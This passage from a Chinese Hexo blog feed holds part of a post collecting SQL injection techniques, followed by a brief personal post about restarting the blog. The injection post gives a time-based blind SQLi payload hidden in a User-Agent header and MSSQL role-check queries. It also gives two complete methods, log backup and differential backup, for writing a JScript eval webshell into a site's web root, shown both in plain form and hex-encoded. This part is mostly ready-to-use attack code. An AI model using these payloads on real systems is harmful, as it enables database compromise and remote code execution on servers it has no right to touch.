class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: www.example.com</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span>&#x27;(select*from(select(sleep(<span class="number">20</span>)))a) #</span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, sdch</span><br><span class="line"><span class="attribute">Accept</span>-Language: en-US,en;q=<span class="number">0</span>.<span class="number">8</span>,fr;q=<span class="number">0</span>.<span class="number">6</span></span><br></pre></td></tr></table></figure><h2 id="sql注入—db-owner权限"><a href="#sql注入—db-owner权限" class="headerlink" title="sql注入—db_owner权限"></a>sql注入—db_owner权限</h2><p>首先进行权限的判断</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="function"><span class="keyword">select</span> <span class="title">IS_SRVROLEMEMBER</span>(<span class="params"><span class="string">&#x27;sysadmin&#x27;</span></span>)) <span class="comment">//判断是否是系统管理员</span></span></span><br><span class="line"><span class="function"><span class="keyword">and</span> 1</span>=(<span class="function">Select <span class="title">IS_MEMBER</span>(<span class="params"><span class="string">&#x27;db_owner&#x27;</span></span>)) <span class="comment">//判断是否是库权限</span></span></span><br><span class="line"><span class="function"><span class="keyword">and</span> 1</span>=(<span class="function">Select <span class="title">IS_MEMBER</span>(<span class="params"><span class="string">&#x27;public&#x27;</span></span>))</span></span><br></pre></td></tr></table></figure><p>getshell的前提首先得有db_owner权限</p><p>想办法获取网站的绝对路径</p><p>进行备份getshell</p><p>Log备份Getshell姿势</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">alter</span> <span class="keyword">database</span> <span class="keyword">test</span> <span class="keyword">set</span> <span class="keyword">RECOVERY</span> <span class="keyword">FULL</span><span class="comment">--</span></span><br><span class="line">;<span class="keyword">create</span> <span class="keyword">table</span> cmd (a image)<span class="comment">--</span></span><br><span class="line">;<span class="keyword">backup</span> <span class="keyword">log</span> <span class="keyword">test</span> <span class="keyword">to</span> disk = <span class="string">&#x27;c:/1.bak&#x27;</span> <span class="keyword">with</span> init<span class="comment">--</span></span><br><span class="line">;<span class="keyword">insert</span> <span class="keyword">into</span> cmd (a) <span class="keyword">values</span> (<span class="string">&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span></span><br><span class="line"><span class="string">%eval(Request.Item[&quot;hackdog&quot;],&quot;unsafe&quot;);%&gt;&#x27;</span>)<span class="comment">--</span></span><br><span class="line">;<span class="keyword">backup</span> <span class="keyword">log</span> <span class="keyword">test</span> <span class="keyword">to</span> disk = <span class="string">&#x27;C:/Users/Administrator/Desktop/wwwroot/xf.aspx&#x27;</span><span class="comment">--</span></span><br><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> cmd<span class="comment">--</span></span><br></pre></td></tr></table></figure><p>差异备份Getshell姿势</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>⾸先完整备份⼀次(c:\ddd.bak为所备份未见)</span><br><span class="line">backup <span class="keyword">database</span> 库名 <span class="keyword">to</span> disk = <span class="string">&#x27;c:\ddd.bak&#x27;</span>;<span class="comment">--</span></span><br><span class="line"><span class="number">2.</span>创建表并插曲⼊数据</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [dbo].[dtest] ([cmd] [image]);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> dtest(cmd)</span><br><span class="line"><span class="keyword">values</span>(<span class="number">0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c285265717</span></span><br><span class="line"><span class="number">56573742e4974656</span>d5b226861636b646f67225d2c22756e7361666522293b253e);<span class="comment">--</span></span><br><span class="line"><span class="number">3.</span>进⾏差异备份</span><br><span class="line">backup <span class="keyword">database</span> 库名 <span class="keyword">to</span> disk=<span class="string">&#x27;⽬标位置\d.asp&#x27;</span> <span class="keyword">WITH</span> DIFFERENTIAL,<span class="keyword">FORMAT</span>;<span class="comment">--</span></span><br><span class="line">上⾯</span><br><span class="line"><span class="number">0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c2852657175657374</span></span><br><span class="line"><span class="number">2e4974656</span>d5b226861636b646f67225d2c22756e7361666522293b253e</span><br><span class="line">就是⼀句话⽊马的内容：&lt;%@ Page <span class="keyword">Language</span>=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;hackdog&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;各种sql注入的收集以及利用&quot;&gt;&lt;a href=&quot;#各种sql注入的收集以及利用&quot; class=&quot;headerlink&quot; title=&quot;各种sql注入的收集以及利用&quot;&gt;&lt;/a&gt;各种sql注入的收集以及利用&lt;/h1&gt;&lt;h2 id=&quot;sql注入的收集&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="渗透学习" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>再用博客</title>
    <link href="http://example.com/wiki/%E5%88%9D%E7%94%A8%E5%8D%9A%E5%AE%A2/"/>
    <id>http://example.com/wiki/%E5%88%9D%E7%94%A8%E5%8D%9A%E5%AE%A2/</id>
    <published>2020-12-06T07:12:46.000Z</published>
    <updated>2020-12-06T07:33:39.646Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在此警醒自己"><a href="#在此警醒自己" class="headerlink" title="在此警醒自己"></a>在此警醒自己</h1><p>​    今天刚花了九牛二虎之力，昨天折腾了一晚上重新搭了一个hexo博客。因为以前的懒得用而荒废了。<a id="more"></a></p><p>​    在这里写下第一篇文章，提醒和警醒自己，不可再像以前一样懒惰，在这里记录下自己的学习和心路历程。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;在此警醒自己&quot;&gt;&lt;a href=&quot;#在此警醒自己&quot; class=&quot;headerlink&quot; title=&quot;在此警醒自己&quot;&gt;&lt;/a&gt;在此警醒自己&lt;/h1&gt;&lt;p&gt;​    今天刚花了九牛二虎之力，昨天折腾了一晚上重新搭了一个hexo博客。因为以前的懒得用而荒废了。</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
</feed>
